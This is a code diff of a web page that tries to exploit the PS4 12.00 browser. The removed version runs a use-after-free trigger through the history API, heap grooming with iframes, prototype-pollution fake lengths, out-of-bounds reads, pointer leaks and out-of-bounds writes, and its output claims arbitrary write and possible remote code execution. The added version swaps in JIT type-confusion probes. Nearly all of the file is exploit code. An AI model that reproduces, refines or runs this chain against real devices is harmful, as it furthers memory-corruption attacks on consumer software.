@@ -2,15 +2,16 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - OOB Read/Write Exploit</title>
+<title>PS4 12.00 - JIT Type Confusion Hunt</title>
 </head>
 <body>
-<h2>PS4 12.00 - Type Confusion → OOB Read/Write</h2>
+<h2>PS4 12.00 - Searching for JIT Type Confusion</h2>
 <p>Status: <span id="status">Ready</span></p>
 
-<button onclick="runOOBRead()">STEP 1 - OOB Read (leak adjacent memory)</button>
-<button onclick="runAddressLeak()">STEP 2 - Address Leak (find pointers)</button>
-<button onclick="runOOBWrite()">STEP 3 - OOB Write (corrupt adjacent objects)</button>
+<button onclick="testJITIntOverflow()">JIT TEST 1 - Integer Overflow</button>
+<button onclick="testJITArrayTransition()">JIT TEST 2 - Array Type Transition</button>
+<button onclick="testJITPolymorphic()">JIT TEST 3 - Polymorphic Confusion</button>
+<button onclick="testJITBailout()">JIT TEST 4 - Bailout Bypass</button>
 
 <pre id="log"></pre>
 
@@ -24,400 +25,305 @@ function log(m){
 }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-const BASE = 977;
-const STEP = 14461;
-const UAF_ITERS = 48;
-
-var keepAlive = [];
-
-// =====================================================
-// STEP 1 - OOB Read via Type Confusion
-// =====================================================
-async function runOOBRead(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running OOB Read...";
-  
-  log("=== STEP 1: OOB Read via Type Confusion ===\n");
-  log("Goal: Read beyond array bounds using fake length\n");
-  
-  // Setup pollution with VERY large fake length
-  log("[SETUP] Polluting with large fake length");
-  
-  Array.prototype.fakeLength = 0x10000; // 64KB "fake" length
-  Array.prototype.fakeButterfly = 0xAABBCCDD;
-  
-  log("  fakeLength: 0x10000 (65536 elements)\n");
-  
-  // Trigger UAF
-  log("[PHASE 1] Triggering UAF");
-  
-  let size = BASE;
-  
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = {
-      index: i,
-      victim: [0x41, 0x42, 0x43, 0x44] // Real length: 4
-    };
-    
-    let frag = "O".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
+// Force JIT compilation
+function forceJIT(func, iterations = 10000) {
+  for(let i=0; i<iterations; i++) {
+    func(i);
   }
-  
-  await sleep(120);
-  
-  // Grooming
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
-    try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>G</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
-  
-  await sleep(80);
-  
-  // Attempt OOB read
-  log("\n[PHASE 2] Attempting OOB read");
-  
-  if(history.state && history.state.victim) {
-    let arr = history.state.victim;
-    
-    log(`Real length: ${arr.length}`);
-    log(`Fake length: 0x${(arr.fakeLength || 0).toString(16)}`);
-    
-    log("\nReading beyond bounds:");
-    
-    let leaked = [];
-    
-    // Read beyond real bounds (index 4+)
-    for(let i=0; i<50; i++) {
-      try {
-        let val = arr[i];
-        
-        if(val !== undefined) {
-          leaked.push({index: i, value: val});
-          
-          if(i < 10 || (val !== 0x41 && val !== 0x42 && val !== 0x43 && val !== 0x44)) {
-            log(`  [${i}] = 0x${val.toString(16)}`);
-          }
-        }
-      } catch(e) {
-        log(`  [${i}] Exception: ${e.message}`);
-        break;
-      }
-    }
-    
-    log(`\nTotal values leaked: ${leaked.length}`);
-    
-    if(leaked.length > 4) {
-      log("\n✓ OOB READ SUCCESSFUL!");
-      log(`✓ Read ${leaked.length - 4} values beyond real bounds`);
-      
-      // Analyze leaked values
-      log("\nAnalyzing leaked data:");
-      
-      let nonOriginal = leaked.filter(v => 
-        v.index >= 4 && 
-        v.value !== 0x41 && 
-        v.value !== 0x42 && 
-        v.value !== 0x43 && 
-        v.value !== 0x44
-      );
-      
-      if(nonOriginal.length > 0) {
-        log(`  Found ${nonOriginal.length} non-original values`);
-        log("  Sample leaked data:");
-        nonOriginal.slice(0, 5).forEach(v => {
-          log(`    [${v.index}] = 0x${v.value.toString(16)}`);
-        });
-        
-        statusEl.textContent = "OOB READ SUCCESS";
-      }
-    }
-  }
-  
-  delete Array.prototype.fakeLength;
-  delete Array.prototype.fakeButterfly;
-  
-  log("\n=== STEP 1 END ===");
 }
 
 // =====================================================
-// STEP 2 - Address Leak via OOB
+// JIT TEST 1 - Integer Overflow in Optimized Code
 // =====================================================
-async function runAddressLeak(){
+function testJITIntOverflow(){
   logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Address Leak...";
+  statusEl.textContent = "Testing JIT Int Overflow...";
   
-  log("=== STEP 2: Address Leak via OOB ===\n");
-  log("Goal: Leak object pointers from adjacent memory\n");
+  log("=== JIT TEST 1: Integer Overflow ===\n");
+  log("Goal: Trigger integer overflow in JIT-compiled code\n");
   
-  // Pollution
-  Array.prototype.fakeLength = 0x10000;
+  // Setup pollution
+  Array.prototype.magicLength = 0x7FFFFFFF;
   
-  log("[SETUP] Creating spray objects with recognizable patterns");
+  log("[SETUP] Function to be JIT compiled:");
   
-  // Spray objects that might be adjacent
-  let spray = [];
-  for(let i=0; i<1000; i++){
-    spray.push({
-      marker: 0xCAFE0000 + i,
-      buffer: new ArrayBuffer(128),
-      index: i
-    });
-  }
-  
-  log(`  Sprayed ${spray.length} objects\n`);
-  
-  await sleep(50);
-  
-  // Trigger UAF
-  log("[PHASE 1] Triggering UAF with spray");
-  
-  let size = BASE;
-  
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = {
-      index: i,
-      victim: [0x11, 0x22, 0x33, 0x44]
-    };
+  // This will be JIT compiled
+  function vulnerableLoop(arr) {
+    let sum = 0;
     
-    let frag = "L".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  await sleep(120);
-  
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
-    try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>G</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
-  
-  await sleep(80);
-  
-  // OOB read for pointers
-  log("\n[PHASE 2] Scanning OOB for pointers");
-  
-  if(history.state && history.state.victim) {
-    let arr = history.state.victim;
-    
-    let pointerCandidates = [];
-    
-    for(let i=0; i<1000; i++) {
-      try {
-        let val = arr[i];
-        
-        if(val !== undefined && val > 0x1000) {
-          // Check if looks like pointer
-          if(val > 0x00100000 && val < 0x7FFFFFFF) {
-            pointerCandidates.push({index: i, value: val});
-          }
-        }
-      } catch(e) {
-        break;
-      }
+    // JIT assumes arr.length is small
+    for(let i=0; i<arr.length; i++) {
+      sum += arr[i] | 0;
     }
     
-    log(`Found ${pointerCandidates.length} pointer candidates\n`);
+    return sum;
+  }
+  
+  log("  Created vulnerableLoop function\n");
+  
+  // Force JIT compilation with small arrays
+  log("[PHASE 1] Training JIT with small arrays (10k iterations)");
+  
+  let trainingArray = [1, 2, 3, 4, 5];
+  forceJIT(vulnerableLoop.bind(null, trainingArray));
+  
+  log("  JIT training complete\n");
+  
+  // Now use array with polluted length
+  log("[PHASE 2] Calling with polluted array");
+  
+  let victimArray = [10, 20, 30, 40];
+  
+  log(`  Real length: ${victimArray.length}`);
+  log(`  Magic length: ${victimArray.magicLength}`);
+  
+  try {
+    // If JIT uses magicLength, this could overflow
+    let result = vulnerableLoop(victimArray);
     
-    if(pointerCandidates.length > 0) {
-      log("Top 10 candidates:");
-      pointerCandidates.slice(0, 10).forEach(p => {
-        log(`  [${p.index}] = 0x${p.value.toString(16).padStart(8,'0')}`);
-      });
-      
-      log("\n✓ ADDRESS LEAK SUCCESSFUL!");
-      log(`✓ Found ${pointerCandidates.length} potential pointers`);
-      
-      statusEl.textContent = "ADDRESS LEAK SUCCESS";
+    log(`\n  Result: ${result}`);
+    log("  Expected: 100 (10+20+30+40)");
+    
+    if(result !== 100) {
+      log("\n🚨 ANOMALY DETECTED!");
+      log(`Unexpected result: ${result}`);
+      log("JIT may be using polluted length!");
+      statusEl.textContent = "ANOMALY FOUND";
     } else {
-      log("⚠️ No obvious pointers found");
-      log("Data may be in different format or location");
+      log("\n✓ Result correct (JIT bounds check working)");
     }
+    
+  } catch(e) {
+    log(`\nException: ${e.message}`);
+    log("This might indicate JIT bailout or crash prevention");
   }
   
-  delete Array.prototype.fakeLength;
+  delete Array.prototype.magicLength;
   
-  log("\n=== STEP 2 END ===");
+  log("\n=== JIT TEST 1 END ===");
 }
 
 // =====================================================
-// STEP 3 - OOB Write (Critical)
+// JIT TEST 2 - Array Type Transition
 // =====================================================
-async function runOOBWrite(){
+function testJITArrayTransition(){
   logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running OOB Write...";
+  statusEl.textContent = "Testing Array Transition...";
   
-  log("=== STEP 3: OOB Write via Type Confusion ===\n");
-  log("Goal: Write beyond array bounds to corrupt adjacent objects\n");
-  
-  log("⚠️  WARNING: This may crash the browser");
-  log("⚠️  This is expected if write succeeds\n");
+  log("=== JIT TEST 2: Array Type Transition ===\n");
+  log("Goal: Confuse JIT with array structure changes\n");
   
   // Pollution
-  Array.prototype.fakeLength = 0x10000;
+  Array.prototype.fakeStructure = 0x41414141;
   
-  log("[SETUP] Creating victim objects");
+  log("[SETUP] JIT-compiled array access function:");
   
-  // Victim objects to corrupt
-  let victims = [];
-  for(let i=0; i<100; i++){
-    victims.push({
-      canary: 0xDEADBEEF,
-      index: i,
-      data: new Uint32Array(32)
-    });
+  function accessArray(arr, index) {
+    return arr[index];
   }
   
-  log(`  Created ${victims.length} victim objects\n`);
+  log("  Created accessArray function\n");
   
-  await sleep(50);
+  // Train JIT with int arrays
+  log("[PHASE 1] Training with integer arrays");
   
-  // Trigger UAF
-  log("[PHASE 1] Triggering UAF");
+  let intArray = [1, 2, 3, 4, 5];
+  forceJIT(accessArray.bind(null, intArray, 2));
   
-  let size = BASE;
+  log("  JIT compiled for int arrays\n");
   
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = {
-      index: i,
-      corrupting: [0x50, 0x51, 0x52, 0x53]
-    };
+  // Transition to double array
+  log("[PHASE 2] Forcing array transition");
+  
+  let transitionArray = [1, 2, 3, 4, 5];
+  transitionArray[0] = 1.1; // Force transition to double
+  
+  log(`  Array transitioned to double storage\n`);
+  
+  // Access with JIT-compiled code
+  log("[PHASE 3] Accessing transitioned array");
+  
+  try {
+    let val = accessArray(transitionArray, 10); // OOB
     
-    let frag = "W".repeat(size);
+    log(`  arr[10] = ${val}`);
     
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  await sleep(120);
-  
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
-    try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>G</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
-  
-  await sleep(80);
-  
-  // Attempt OOB write
-  log("\n[PHASE 2] Attempting OOB write");
-  
-  if(history.state && history.state.corrupting) {
-    let arr = history.state.corrupting;
-    
-    log(`Real length: ${arr.length}`);
-    log(`Fake length: 0x${(arr.fakeLength || 0).toString(16)}\n`);
-    
-    log("Writing beyond bounds:");
-    
-    try {
-      // Write controlled values OOB
-      for(let i=10; i<50; i++) {
-        arr[i] = 0xC0000000 + i;
-        
-        if(i < 20) {
-          log(`  [${i}] = 0x${arr[i].toString(16)}`);
-        }
+    if(val !== undefined) {
+      log("\n🚨 OOB READ DETECTED!");
+      log(`Read value beyond bounds: ${val}`);
+      
+      if(typeof val === 'number') {
+        log(`  As hex: 0x${val.toString(16)}`);
       }
       
-      log("\n✓ OOB WRITE succeeded without crash!");
-      log("✓ Checking victim objects for corruption...\n");
-      
-      // Check victims
-      let corrupted = 0;
-      
-      for(let v of victims) {
-        if(v.canary !== 0xDEADBEEF) {
-          log(`  Victim ${v.index} CORRUPTED: canary = 0x${v.canary.toString(16)}`);
-          corrupted++;
-        }
-      }
-      
-      log(`\nCorrupted victims: ${corrupted}/${victims.length}`);
-      
-      if(corrupted > 0) {
-        log("\n🚨🚨🚨 CRITICAL SUCCESS 🚨🚨🚨");
-        log("✓ OOB write corrupted adjacent objects!");
-        log("✓ Arbitrary write primitive achieved!");
-        log("✓ RCE is now possible!");
-        
-        statusEl.textContent = "ARBITRARY WRITE CONFIRMED";
-      } else {
-        log("\n✓ Write succeeded but no corruption detected");
-        log("Victims may not be adjacent in memory");
-      }
-      
-    } catch(e) {
-      log(`\nException during write: ${e.message}`);
-      log("This may indicate:")
-      log("  - Write hit protected memory");
-      log("  - Crash prevented by engine");
-      log("  - Or write actually succeeded and crashed browser");
+      statusEl.textContent = "OOB READ FOUND";
+    } else {
+      log("\n✓ Bounds check still working");
     }
+    
+  } catch(e) {
+    log(`\nException: ${e.message}`);
   }
   
-  delete Array.prototype.fakeLength;
+  delete Array.prototype.fakeStructure;
   
-  log("\n=== STEP 3 END ===");
+  log("\n=== JIT TEST 2 END ===");
 }
 
-log("PS4 12.00 - OOB Read/Write Exploitation");
-log("\nBased on confirmed type confusion:");
-log("✓ Fake length: 0x1000 vs real: 4");
-log("✓ Pollution preserved through UAF");
-log("✓ Type confusion repeatable");
-log("\nExploitation steps:");
-log("1. OOB Read - leak adjacent memory");
-log("2. Address Leak - find object pointers");
-log("3. OOB Write - corrupt adjacent objects (⚠️ may crash)");
-log("\n⚠️ STEP 3 is high risk - may crash browser");
-log("Execute 1 → 2 first, then 3 if ready");
+// =====================================================
+// JIT TEST 3 - Polymorphic Inline Cache Confusion
+// =====================================================
+function testJITPolymorphic(){
+  logEl.textContent = "";
+  statusEl.textContent = "Testing Polymorphic IC...";
+  
+  log("=== JIT TEST 3: Polymorphic Confusion ===\n");
+  log("Goal: Confuse polymorphic inline cache\n");
+  
+  // Pollution
+  Object.prototype.hiddenClass = 0xDEADBEEF;
+  
+  log("[SETUP] Polymorphic function:");
+  
+  function processObject(obj) {
+    return obj.value * 2;
+  }
+  
+  // Train with multiple object shapes
+  log("[PHASE 1] Training with multiple shapes");
+  
+  class ShapeA { constructor(v) { this.value = v; } }
+  class ShapeB { constructor(v) { this.value = v; this.extra = 0; } }
+  class ShapeC { constructor(v) { this.value = v; this.other = 1; } }
+  
+  for(let i=0; i<3000; i++) {
+    processObject(new ShapeA(i));
+    processObject(new ShapeB(i));
+    processObject(new ShapeC(i));
+  }
+  
+  log("  Polymorphic IC trained\n");
+  
+  // Create object with polluted prototype
+  log("[PHASE 2] Using polluted object");
+  
+  let victim = { value: 100 };
+  
+  log(`  victim.value: ${victim.value}`);
+  log(`  victim.hiddenClass: 0x${victim.hiddenClass.toString(16)}`);
+  
+  try {
+    let result = processObject(victim);
+    
+    log(`\n  Result: ${result}`);
+    log(`  Expected: 200`);
+    
+    // Check if pollution affected execution
+    if(result !== 200 && !isNaN(result)) {
+      log("\n🚨 POLYMORPHIC CONFUSION!");
+      log(`Unexpected result: ${result}`);
+      statusEl.textContent = "IC CONFUSION FOUND";
+    }
+    
+  } catch(e) {
+    log(`\nException: ${e.message}`);
+  }
+  
+  delete Object.prototype.hiddenClass;
+  
+  log("\n=== JIT TEST 3 END ===");
+}
+
+// =====================================================
+// JIT TEST 4 - Bailout Bypass
+// =====================================================
+function testJITBailout(){
+  logEl.textContent = "";
+  statusEl.textContent = "Testing Bailout Bypass...";
+  
+  log("=== JIT TEST 4: Bailout Bypass ===\n");
+  log("Goal: Prevent JIT bailout with pollution\n");
+  
+  // Pollution to bypass checks
+  Array.prototype.isArray = true;
+  Array.prototype.constructor = Array;
+  
+  log("[SETUP] Function with type checks:");
+  
+  function typeConfused(input) {
+    // JIT assumes this always gets real arrays
+    if(Array.isArray(input)) {
+      let sum = 0;
+      for(let i=0; i<input.length; i++) {
+        sum += input[i];
+      }
+      return sum;
+    }
+    return 0;
+  }
+  
+  // Train with real arrays
+  log("[PHASE 1] Training with real arrays");
+  
+  for(let i=0; i<10000; i++) {
+    typeConfused([1, 2, 3, 4, 5]);
+  }
+  
+  log("  JIT compiled\n");
+  
+  // Try with fake array (object pretending to be array)
+  log("[PHASE 2] Using fake array object");
+  
+  let fakeArray = {
+    0: 10,
+    1: 20,
+    2: 30,
+    length: 3
+  };
+  
+  // Make it pass Array.isArray via pollution
+  fakeArray.__proto__ = Array.prototype;
+  
+  log(`  fakeArray.isArray: ${Array.isArray(fakeArray)}`);
+  log(`  fakeArray.length: ${fakeArray.length}`);
+  
+  try {
+    let result = typeConfused(fakeArray);
+    
+    log(`\n  Result: ${result}`);
+    log(`  Expected: 60 (10+20+30)`);
+    
+    if(result === 60) {
+      log("\n✓ JIT accepted fake array!");
+      log("But no type confusion (correct result)");
+    } else if(result !== 0) {
+      log("\n🚨 TYPE CONFUSION!");
+      log(`Unexpected result: ${result}`);
+      statusEl.textContent = "BAILOUT BYPASSED";
+    }
+    
+  } catch(e) {
+    log(`\nException: ${e.message}`);
+  }
+  
+  delete Array.prototype.isArray;
+  delete Array.prototype.constructor;
+  
+  log("\n=== JIT TEST 4 END ===");
+}
+
+log("PS4 12.00 - JIT Type Confusion Hunt");
+log("\nStrategy: Use confirmed pollution to confuse JIT");
+log("\nTests:");
+log("1. Integer Overflow - JIT with polluted length");
+log("2. Array Transition - Structure change confusion");
+log("3. Polymorphic IC - Inline cache confusion");
+log("4. Bailout Bypass - Prevent deoptimization");
+log("\nLooking for:");
+log("- Anomalous results (wrong calculations)");
+log("- OOB access (read beyond bounds)");
+log("- Type confusion (wrong type handling)");
+log("- Crashes (optimization gone wrong)");
 </script>
 </body>
 </html>
